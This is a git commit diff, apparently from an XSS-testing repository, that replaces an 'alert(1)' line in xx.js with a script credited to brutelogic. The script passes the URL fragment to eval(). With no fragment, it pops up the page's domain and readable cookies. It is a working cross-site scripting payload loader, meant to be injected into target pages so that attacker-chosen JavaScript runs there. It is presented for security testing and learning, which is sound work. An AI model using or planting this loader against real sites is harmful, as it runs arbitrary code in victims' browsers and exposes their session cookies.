60d3508500f7dcb6974ffcb590089d9b7dd86bef
shb360 <157382722+shb360@users.noreply.github.com>
2025-01-26 19:00:27 +0100

    Update xx.js

--- xx.js
+++ xx.js
@@ -1,1 +1,34 @@
-alert(1)
+/* =================================== !/
+
+X55 is... Cross-Site Scripting!
+
+Please check below on how to use this domain for XSS:
+https://twitter.com/brutelogic/status/1488523712244637708
+
+By @brutelogic
+Visit https://knoxss.pro for best XSS tool out there.
+
+/! =================================== */
+
+if (document.location.hash) {
+   var frag = document.location.hash.match(/[^#][^#]*/)[0];
+}
+
+if (frag) {
+
+  try {
+
+    eval(frag);
+
+  } catch(e) {
+
+    alert("URL fragment (#) contains invalid JS code, try again!");
+  }
+
+} else {
+
+  alert('Context Domain: '+document.domain+'\n\nReadable Cookies: \n'+document.cookie);
+
+}
+
+// #hack2learn
